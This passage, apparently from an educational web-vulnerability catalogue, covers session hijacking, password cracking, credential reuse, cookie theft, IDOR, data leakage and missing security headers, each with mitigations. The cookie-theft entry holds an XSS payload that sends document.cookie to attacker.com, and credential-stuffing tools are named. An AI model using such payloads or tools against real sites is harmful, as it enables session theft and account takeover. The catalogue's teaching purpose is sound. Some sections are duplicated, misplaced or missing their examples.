### 🔍 Indicators of Vulnerability

| Behavior                              | Risk                         |
|---------------------------------------|------------------------------|
| No delay or lockout after failures    | High risk of brute force     |
| Common usernames/passwords accepted   | Poor credential hygiene      |
| No CAPTCHA or rate limiting           | Susceptible to automation    |

---

### 📚 References

- [OWASP: Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [OWASP Top 10 - Broken Authentication](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)

***

# 🌐 WebVuln-020: Session Hijacking

**Category:**  
Session Management

**Vulnerability ID:**  
**WEBVULN-020**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
A session ID is transmitted via an insecure channel or is predictable, allowing an attacker to steal or guess the session ID.

---

### 🧩 Payload:
- **Stealing Session ID via sniffing**  
   If an attacker has access to the network traffic (e.g., via a man-in-the-middle attack), they can capture the session cookie or token.

- **Session Fixation Attack**  
   An attacker may force a user to use a predetermined session ID by embedding it in a URL, request parameter, or via other means.

---

### ✅ Effect:
- **Session hijacking** allows attackers to impersonate a legitimate user and gain unauthorized access to sensitive data or functionality.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Use Secure HTTP-only Cookies**  
  Ensure cookies are marked with `HttpOnly` and `Secure` flags.
  
- ✅ **Use TLS/SSL**  
  Encrypt all communication channels to prevent sniffing of session tokens.

- ✅ **Implement Session Expiry and Regeneration**  
  Regularly regenerate session IDs after login and set an appropriate session timeout.

- ✅ **Enforce IP and User-Agent Binding**  
  Validate session IDs against IP addresses and user-agent strings.

---

## 🔧 Testing Tools / Techniques
- Burp Suite (for session token interception)
- Wireshark (for sniffing network traffic)
- OWASP ZAP (for vulnerability scanning)
- Manual testing with session hijacking techniques

---

## 📚 References
- OWASP: Session Hijacking  
- PortSwigger: Session Hijacking  
- OWASP Cheat Sheet: Secure Session Management

***
# 🌐 WebVuln-021: Password Cracking

**Category:**  
Authentication

**Vulnerability ID:**  
**WEBVULN-021**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
An attacker tries to guess or crack a user’s password by using techniques such as brute force, dictionary attacks, or rainbow tables.

---

### 🧩 Payload:
- **Brute Force Attack**: An attacker systematically checks all possible combinations of characters for a password.
- **Dictionary Attack**: The attacker uses a precompiled list of common passwords or dictionary words to attempt login.
- **Rainbow Table Attack**: The attacker uses precomputed hash values to quickly compare with password hashes in the database.

---

### ✅ Effect:
- **Account Compromise**: Successful password cracking allows an attacker to gain unauthorized access to a user’s account.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Enforce Strong Password Policies**  
  Require a mix of upper and lower case letters, numbers, and special characters.
  
- ✅ **Limit Login Attempts**  
  Implement account lockout or CAPTCHA after a predefined number of failed login attempts.

- ✅ **Use Salted Password Hashes**  
  Salt passwords before hashing to prevent the use of rainbow tables.

- ✅ **Enforce Multi-Factor Authentication (MFA)**  
  Require an additional form of authentication beyond just the password.

---

## 🔧 Testing Tools / Techniques
- Hydra (for brute force and dictionary attacks)
- Burp Suite Intruder (for automated password cracking)
- John the Ripper (for cracking password hashes)
- OWASP ZAP (for vulnerability scanning and brute force testing)

---

## 📚 References
- OWASP: Password Cracking  
- PortSwigger: Password Cracking  
- OWASP Cheat Sheet: Secure Authentication

***
# 🌐 WebVuln-021: Weak Password Storage

**Category:**  
Authentication

**Vulnerability ID:**  
`WEBVULN-021`

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
A system stores passwords in an insecure manner, such as in plain text or using weak encryption/hashing algorithms.

---

### 🧩 Payload:
- **Plain Text Storage**: The password is stored directly in the database without encryption or hashing.
- **Weak Hashing Algorithm**: Storing passwords using weak algorithms like MD5 or SHA1, which are vulnerable to collision or brute force attacks.

---

### ✅ Effect:
- **Exposure of User Credentials**: If the database is compromised, attackers can easily recover and misuse passwords if stored in an insecure manner.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Use Strong Hashing Algorithms**  
  Hash passwords with strong algorithms like bcrypt, Argon2, or PBKDF2.
  
- ✅ **Use Salted Hashes**  
  Add a unique salt to each password before hashing to prevent rainbow table attacks.

- ✅ **Use Key Stretching**  
  Employ key stretching techniques (e.g., bcrypt) to increase the time needed to compute password hashes.

- ✅ **Encrypt Sensitive Data**  
  Store sensitive data like passwords using strong encryption methods, such as AES-256.

  ***
  # 🌐 WebVuln-022: Credential Reuse

**Category:**  
Authentication and Session Management

**Vulnerability ID:**  
**WEBVULN-022**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
Credential reuse happens when a user uses the same password across multiple services. An attacker who gains access to one service may use the same credentials to gain unauthorized access to other services (e.g., using breached credentials from a data leak).

### 🔑 Example:
- If a user’s password is found in a data breach (e.g., via a service like Have I Been Pwned), an attacker can use the same password on other platforms to try and break into the user’s accounts on different sites.

---

## 💥 Payload:

- **Credential List:**  
  User credentials (e.g., username and password) from one service can be reused to attempt login to other platforms that the user might have an account with.

---

### ✅ Effect

- **Unauthorized Access:**  
  Attackers can access multiple services or systems if a user has reused the same credentials across different sites.

- **Account Takeover:**  
  Attackers can take over user accounts in multiple platforms without needing to bypass individual authentication mechanisms.

---

## 🌐 PoC Platforms

Simulate this vulnerability by using the following:

- **Have I Been Pwned** (to check if credentials were part of a breach)
- **Credential Stuffing Attack Simulation:**  
  Use tools like **Sentry MBA** or **Snipr** to simulate credential stuffing attacks.

---

## 🛡️ Mitigation

To mitigate the risk of credential reuse, consider the following best practices:

- ✅ **Use Unique Passwords:**  
  Encourage users to use different passwords for every service. Password managers can help users store unique passwords securely.

- ✅ **Implement Two-Factor Authentication (2FA):**  
  Even if credentials are reused, 2FA will prevent unauthorized access, as attackers would need the second factor (e.g., an SMS code or authentication app code).

- ✅ **Monitor for Breaches:**  
  Use services like **Have I Been Pwned** to monitor for any breaches of your system’s users. Notify users to change their passwords if their credentials are exposed in any breach.

- ✅ **Password Policies:**  
  Enforce strong password policies (e.g., minimum length, special characters, etc.) to ensure users create hard-to-guess passwords.

- ✅ **Account Lockout & Rate Limiting:**  
  To protect against credential stuffing, implement rate-limiting, CAPTCHA challenges, and account lockouts after multiple failed login attempts.

---

## 🔧 Testing Tools / Techniques

- **Burp Suite:**  
  Use the Intruder feature to attempt credential stuffing with known breached passwords.

- **OWASP ZAP:**  
  Use ZAP to simulate attacks that test for weak or reused passwords across multiple services.

- **Have I Been Pwned API:**  
  Use the API to check if the user’s credentials have been part of a known data breach.

- **Hydra:**  
  Use Hydra for brute-force or credential-stuffing attacks if the target allows for automated login attempts.

- **Manual Testing:**  
  Test for weak or reused passwords by attempting logins with breached credentials or default password lists.

---

## 📚 References

- **OWASP: Password Management Cheat Sheet**  
  Link: [OWASP Password Management](https://cheatsheetseries.owasp.org/cheatsheets/Password_Management_Cheat_Sheet.html)

- **OWASP Top 10 - A2: Broken Authentication**  
  Link: [OWASP Top 10](https://owasp.org/www-project-top-ten/)

- **Have I Been Pwned:**  
  Link: [Have I Been Pwned](https://haveibeenpwned.com/)

- **PortSwigger: Credential Stuffing Attacks**  
  Link: [PortSwigger Credential Stuffing](https://portswigger.net/research/credential-stuffing)

- **OWASP Cheat Sheet: Secure Password Storage**  
  Link: [OWASP Secure Password Storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)


---

## 🔧 Testing Tools / Techniques
- Burp Suite (to intercept login requests and test password storage)
- John the Ripper (to test password hash strength)
- Hashcat (for cracking weakly hashed passwords)
- OWASP ZAP (to test for weak password storage vulnerabilities)

---

## 📚 References
- OWASP: Password Storage Cheat Sheet  
- OWASP Top 10 - A2: Broken Authentication  
- PortSwigger: Password Storage Vulnerabilities  
- OWASP Cheat Sheet: Secure Storage of Passwords

***
# 🌐 WebVuln-023: Insecure Authentication

**Category:**  
Authentication

**Vulnerability ID:**  
**`WEBVULN-023`**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
A web application fails to securely authenticate users, allowing unauthorized access or weak user verification. This can occur through improper implementation of authentication mechanisms, such as insecure session management or missing authentication mechanisms.

---

### 🧩 Payload:
- **Missing Session Expiry**: A session is not terminated after user logout or after a certain period of inactivity.
- **Weak Password Policies**: Allowing users to create easily guessable passwords (e.g., "password123").
- **Bypassing Authentication**: An attacker finds ways to bypass authentication, such as manipulating URL parameters or accessing sensitive endpoints without proper checks.

---

### ✅ Effect:
- **Unauthorized Access**: Attackers can gain access to restricted areas or accounts without proper authentication.
- **Session Hijacking**: If authentication tokens are poorly managed or transmitted insecurely, they can be hijacked.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Implement Secure Authentication Protocols**  
  Use strong authentication mechanisms like OAuth2, OpenID Connect, or multi-factor authentication (MFA).
  
- ✅ **Enforce Strong Password Policies**  
  Require strong passwords with a mix of letters, numbers, and special characters.

- ✅ **Use Secure Session Management**  
  Ensure that sessions are securely managed, with proper expiry, regeneration after login, and timeout mechanisms.

- ✅ **Implement CAPTCHA and Rate Limiting**  
  Use CAPTCHA and rate limiting to prevent automated login attempts and brute force attacks.

---

## 🔧 Testing Tools / Techniques
- Burp Suite (to intercept and test authentication flows)
- OWASP ZAP (for scanning insecure authentication mechanisms)
- Hydra (for testing login forms with common usernames and passwords)
- Manual testing of login and session management mechanisms

---

## 📚 References
- OWASP: Insecure Authentication  
- PortSwigger: Insecure Authentication  
- OWASP Cheat Sheet: Authentication  
- OWASP Top 10 - A2: Broken Authentication

***
# 🌐 WebVuln-024: Cookie Theft

**Category:**  
Session Management

**Vulnerability ID:**  
`WEBVULN-024`

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
An attacker can steal session cookies or authentication tokens through various means, such as **XSS** or **MITM** attacks, or by exploiting insecure cookie handling mechanisms in the web application.

---

### 🧩 Payload

#### **XSS (Cross-Site Scripting)**
Injecting malicious JavaScript into the application to steal cookies.

Example:
```javascript
document.location = 'http://attacker.com/cookie?'+document.cookie;
```
## 🌐 MITM Attack

If no encryption (SSL/TLS) is used, an attacker on an insecure network can intercept HTTP traffic and capture cookies.

---

### ✅ Effect

- **Session Hijacking:**  
  Once an attacker steals a valid session cookie, they can impersonate the victim and gain unauthorized access to their account or session.

- **Credential Theft:**  
  Cookies containing sensitive data, such as authentication tokens, can be captured and used for further attacks, like credential stuffing.

---

## 🌐 PoC Platforms

You can simulate this vulnerability using the following platforms:

- **DVWA (Damn Vulnerable Web Application)**  
- **bWAPP (Buggy Web Application)**  
- **WebGoat (A security-focused web application)**

---

## 🛡️ Mitigation

To mitigate the risk of cookie theft, consider the following best practices:

- ✅ **Use Secure Cookies:**  
  Ensure cookies are marked with the `HttpOnly`, `Secure`, and `SameSite` flags to reduce the risk of theft via XSS and ensure cookies are only sent over HTTPS.

- ✅ **Implement SSL/TLS (HTTPS):**  
  Always use HTTPS to encrypt communication between the client and server, which helps prevent MITM attacks and protects session cookies in transit.

- ✅ **Use SameSite Cookies:**  
  Set the `SameSite` attribute of cookies to `Strict` or `Lax` to mitigate CSRF (Cross-Site Request Forgery) and reduce the risk of cookie theft through cross-site attacks.

- ✅ **Regular Session Regeneration:**  
  Regenerate session IDs after login and periodically during a session to prevent session fixation and reduce the impact of stolen session cookies.

- ✅ **Implement Token-Based Authentication:**  
  Use token-based authentication mechanisms (e.g., JWT) for stateless sessions to prevent the reliance on session cookies.

---

## 🔧 Testing Tools / Techniques

The following tools and techniques can be used to test for and exploit cookie theft vulnerabilities:

- **Burp Suite:**  
  Use Burp Suite to intercept and manipulate cookies, as well as to test for vulnerabilities in session management.

- **OWASP ZAP:**  
  A popular open-source tool for security testing, including scanning for XSS vulnerabilities and insecure cookie handling.

- **Wireshark:**  
  Use Wireshark to sniff unencrypted HTTP traffic and capture session cookies if no SSL/TLS encryption is used.

- **Manual Testing:**  
  Test for weak or missing cookie flags, XSS vulnerabilities, and other session management weaknesses manually.

---

## 📚 References

- **OWASP: Session Management**  
  Link: [OWASP Session Management](https://owasp.org/www-project-top-ten/)

- **OWASP Top 10 - A2: Broken Authentication**  
  Link: [OWASP Top 10](https://owasp.org/www-project-top-ten/)

- **PortSwigger: Cookie Theft and XSS**  
  Link: [PortSwigger Cookie Theft](https://portswigger.net/web-security/cross-site-scripting)

- **OWASP Cheat Sheet: Secure Session Management**  
  Link: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)


***
## PART III Sensitive Data Exposure
***
Sensitive Data Exposure
---
### WEBVULN-025: Inadequate Encryption

---

#### 📂 Category:
Cryptographic Issues

---

#### 🐞 Vulnerability:
Inadequate Encryption

---

#### 🔍 Description:
Inadequate encryption refers to the use of weak, outdated, or improperly implemented cryptographic algorithms, libraries, or protocols. This allows attackers to potentially decrypt, alter, or impersonate data and communications. Common scenarios include:
- Use of outdated SSL/TLS versions (e.g., SSLv3, TLS 1.0).
- Weak encryption algorithms (e.g., RC4, DES, MD5).
- Poor key management (e.g., hardcoded or reused keys).
- Missing encryption for sensitive data at rest or in transit.

---

#### 💣 Demo / Proof of Concept:

**Scenario**:  
A login form submits credentials over HTTP or via a weak cipher suite in TLS. An attacker on the same network captures traffic using a packet sniffer and extracts login credentials.

**Example Attack Tools**:
- `Wireshark` for traffic sniffing.
- `mitmproxy` for interception and SSL stripping.
- `testssl.sh` for detecting weak TLS configurations.

---

#### 🛡️ Mitigation:

- Enforce HTTPS using TLS 1.2 or higher (preferably TLS 1.3).
- Disable weak ciphers and insecure protocol versions in server configuration.
- Use strong algorithms (e.g., AES-GCM, SHA-256, RSA-2048+).
- Implement proper key management (e.g., key rotation, secure storage).
- Use HSTS to prevent protocol downgrade attacks.

---

#### 🧪 Testing Tools / Techniques:

- **testssl.sh**
- **Qualys SSL Labs** (https://www.ssllabs.com/ssltest/)
- `nmap --script ssl-enum-ciphers -p 443 <target>`
- `openssl s_client -connect <host>:443 -cipher LOW`

---

#### 📚 References:

- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [CWE-326: Inadequate Encryption Strength](https://cwe.mitre.org/data/definitions/326.html)
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)

***
### WEBVULN-026: Insecure Direct Object Reference (IDOR)

---

#### 📂 Category:
Broken Access Control

---

#### 🐞 Vulnerability:
Insecure Direct Object Reference (IDOR)

---

#### 🔍 Description:
Insecure Direct Object Reference (IDOR) occurs when an application provides direct access to objects (such as files, database records, or URLs) based on user-supplied input without proper access control checks. An attacker can manipulate input parameters to gain unauthorized access to data or actions.

**Example Scenarios**:
- Accessing another user’s account data by changing a user ID in the URL.
- Downloading restricted files by altering file path or ID.
- Viewing or editing other users’ invoices, tickets, or orders.

---

#### 💣 Demo / Proof of Concept:

**Scenario**:  
A user accesses their profile using this URL:

By modifying the `id` parameter to `1002`, they can view another user's profile:


**Tools Used**:
- Burp Suite Repeater or Intruder
- Postman
- Custom Python scripts for parameter fuzzing

---

#### 🛡️ Mitigation:

- Enforce strict access controls on the server side.
- Never rely on client-side checks for authorization.
- Use indirect references such as UUIDs or securely mapped tokens.
- Implement object-level permission checks for every request.
- Log access violations and monitor unusual access patterns.

---

#### 🧪 Testing Tools / Techniques:

- Manual testing with Burp Suite or Postman
- OWASP ZAP with forced browsing
- Fuzzing predictable parameters and observing responses
- Review logs for unauthorized access attempts

---

#### 📚 References:

- [OWASP IDOR Guide](https://owasp.org/www-community/attacks/Indirect_Object_Reference)
- [OWASP Broken Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Broken_Access_Control_Cheat_Sheet.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)

***
## WEBVULN-027: Data Leakage

**Category:** Information Disclosure

**Vulnerability:** Data Leakage

**Description:**
Data leakage refers to the unintended or unauthorized exposure of sensitive information, such as application configuration details, environment variables, internal API keys, credentials, stack traces, internal IPs, source code, or PII (Personally Identifiable Information). This often occurs due to misconfigurations, verbose error messages, improper access controls, or unfiltered user input being echoed back to the client.

Common causes include:
- Verbose error handling in production environments
- Exposing `.git/`, `.env`, `backup/`, or similar directories/files
- Debug features being enabled in production
- Improperly configured cloud storage (e.g., public S3 buckets)
- Misconfigured API responses

**Demo/Proof of Concept:**
1. Accessing exposed `.env` file:
`https://example.com/.env`
May reveal:
DB_PASSWORD=SuperSecret123 API_KEY=abcd1234efgh5678


2. Verbose error:
```http
GET /api/user?id=notanumber HTTP/1.1

HTTP/1.1 500 Internal Server Error
Content-Type: text/html

Exception: TypeError at /api/user
int() argument must be a string, a bytes-like object or a number, not 'NoneType'

Publicly accessible backup:
`https://example.com/backup.zip`

### 📟 Verbose Error Example

```http
GET /api/user?id=notanumber HTTP/1.1

HTTP/1.1 500 Internal Server Error
Content-Type: text/html

Exception: TypeError at /api/user
int() argument must be a string, a bytes-like object or a number, not 'NoneType'
```

---

### 💾 Publicly Accessible Backup

```text
https://example.com/backup.zip
```

---

### 🛡️ Mitigation

- Disable detailed error messages in production.
- Use environment variables securely and restrict access to internal files like `.env`, `.git/`, `config/`, etc.
- Ensure cloud storage buckets are private by default.
- Apply proper access control and input validation.
- Scan and monitor endpoints for sensitive file exposure.
- Implement logging and alerting mechanisms for unusual data access patterns.
- Run content security audits regularly.

---

### 🧪 Testing Tools/Techniques

- Manual inspection of URLs and hidden directories
- Directory brute-forcing tools like:
  - `dirsearch`
  - `gobuster`
  - `ffuf`
- Inspect HTTP responses for stack traces and detailed errors
- Use recon tools to find open cloud buckets or backup files:
  - `AWSBucketDump`
  - `S3Scanner`
- Check for known leaks using tools like:
  - `truffleHog`
  - `GitLeaks`

---

### 📚 References

- [OWASP: Information Leakage](https://owasp.org/www-community/Improper_Information_Leakage)
- [OWASP Testing Guide: Testing for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/01-Testing_for_Information_Leakage.html)
- [GitHub - truffleHog](https://github.com/trufflesecurity/trufflehog)
- [GitHub - GitLeaks](https://github.com/gitleaks/gitleaks)

***
## WEBVULN-028: Unencrypted Data Storage

**Category:** Insecure Data Storage

**Vulnerability:** Unencrypted Data Storage

**Description:**
Unencrypted data storage occurs when sensitive information such as passwords, access tokens, personally identifiable information (PII), or financial records is stored in plaintext — whether in databases, local files, cookies, or logs — without adequate encryption mechanisms in place. This poses a serious security risk in case of data breaches, physical device theft, or server compromise.

Common causes include:
- Developers storing credentials or tokens in plaintext for debugging or simplicity.
- Misconfigured database storage lacking field-level encryption.
- Client-side storage of tokens or secrets in localStorage/sessionStorage.
- Logs capturing sensitive inputs or responses in readable form.

---

### 💣 Risk Example

```text
users.db
--------------
username: johndoe
password: hunter2
email: johndoe@example.com
card_number: 4111111111111111
cvv: 123
```

This file is stored unencrypted on disk and is readable by anyone with file access.

---

### 🛡️ Mitigation

- Use strong encryption (AES-256 or better) for storing sensitive data at rest.
- Store cryptographic keys securely (e.g., in HSMs or dedicated key management services).
- Hash passwords using secure algorithms like `bcrypt`, `argon2`, or `PBKDF2`.
- Avoid storing unnecessary sensitive data; follow data minimization principles.
- Avoid storing secrets in client-side localStorage/sessionStorage.
- Regularly audit stored data and review access control policies.
- Ensure backups are also encrypted and securely stored.
- Sanitize logs to remove or mask sensitive data.

---

### 🧪 Testing Tools/Techniques

- Inspect backend database storage for plaintext entries.
- Search project directories for `.db`, `.log`, `.bak`, or `.json` files with sensitive data.
- Review app logs for exposed passwords, tokens, or payment info.
- Use mobile app assessment tools to scan local data storage:
  - `MobSF`
  - `Frida`
  - `Objection`
- Review browser dev tools for client-side secrets in localStorage or cookies.

---

### 📚 References

- [OWASP Mobile Top 10: M2 - Insecure Data Storage](https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [NIST SP 800-57 Part 1: Key Management Guidelines](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)

***
## WEBVULN-029: Missing Security Headers

**Category:** Security Misconfiguration

**Vulnerability:** Missing Security Headers

**Description:**
Missing security headers in HTTP responses can leave web applications vulnerable to a wide range of attacks, including clickjacking, XSS, MIME sniffing, and more. Security headers are part of defense-in-depth and provide essential protection by instructing browsers how to behave when interacting with your site.

Common missing headers and their impact:
- `Content-Security-Policy`: Prevents XSS by controlling sources of scripts, styles, etc.
- `X-Frame-Options`: Protects against clickjacking by preventing framing.
- `X-Content-Type-Options`: Stops MIME-sniffing attacks.
- `Strict-Transport-Security`: Enforces HTTPS connections.
- `Referrer-Policy`: Controls the amount of referrer information sent.
- `Permissions-Policy`: Restricts use of browser features (e.g., camera, microphone).
- `Cross-Origin-Embedder-Policy`, `Cross-Origin-Resource-Policy`, and `Cross-Origin-Opener-Policy`: Provide protections against cross-origin attacks.

---

### 📄 Risk Example

```http
HTTP/1.1 200 OK
Content-Type: text/html

<!-- No security headers present -->
```

This allows an attacker to:
- Inject scripts (`XSS`)
- Embed the site in an `<iframe>` (`clickjacking`)
- Trick the browser into interpreting data incorrectly (`MIME sniffing`)

---

### 🛡️ Mitigation

- Set the following headers on all HTTP responses:

```http
Content-Security-Policy: default-src 'self';
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), camera=()
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

- Use a web server or middleware (e.g., Nginx, Apache, Express.js Helmet) to enforce headers globally.
- Regularly test for header presence using security scanners.
- Customize CSP rules according to your app’s needs (avoid overly permissive values like `unsafe-inline`).

---

### 🧪 Testing Tools/Techniques

- Use online scanners:
  - [SecurityHeaders.com](https://securityheaders.com/)
  - [Mozilla Observatory](https://observatory.mozilla.org/)
- Use command-line tools:
  - `curl -I https://yourdomain.com`
  - `nmap --script http-security-headers`
- Analyze browser DevTools > Network > Headers tab
- Automate checks using CI/CD security tools or SAST scanners

---

### 📚 References

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [Mozilla Developer Docs: Security Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [OWASP Cheat Sheet: HTTP Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
***
